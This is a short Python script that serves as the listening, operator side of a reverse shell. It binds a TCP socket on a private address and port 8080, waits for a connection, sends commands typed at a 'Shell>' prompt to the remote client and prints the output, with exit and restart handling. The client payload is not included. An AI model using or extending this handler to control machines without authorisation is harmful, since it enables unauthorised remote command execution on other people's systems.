#!/usr/bin/env python
#Python 3
#Server

import socket, time, sys

ip_address = "192.168.0.200"
port = 8080

def create_socket():
  global ip_address, port

  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.bind((ip_address, port));
  s.listen(1)
  print("\nNew socket was created")
  return s

def connect():
    global CMD

    try:
      s = create_socket()
      conn, addr = s.accept()
      print('[+] connection from ', addr)
      while(1):
          command = check_input()
          if 'exit' in command:
              conn.send(command.encode())
              conn.close()
              break
          elif 'restart' in command:
              conn.send(command.encode())
              conn.close()
              return "restart"
          else:
              conn.send(command.encode())
              print(conn.recv(1024).decode())
    except KeyboardInterrupt:
      print("Ctrl + C pressed, shuting down ..")
      conn.send('restart'.encode())
      conn.close()

def timer(seconds):
  print("Plase standby restarting the process: takes {} sec".format(seconds))
  for i in range(1, seconds):
    time.sleep(1)
    number = seconds - i
    sys.stdout.flush()
    sys.stdout.write(" " + str(number) + " ")
    sys.stdout.flush()

def check_input():
  cmd = input("Shell>")
  if len(cmd) > 0:
    return cmd
  else:
    return "ls -lA"

def main():
  if connect() == "restart":
    timer(80)
    sys.stdout.flush()
    main()

main()
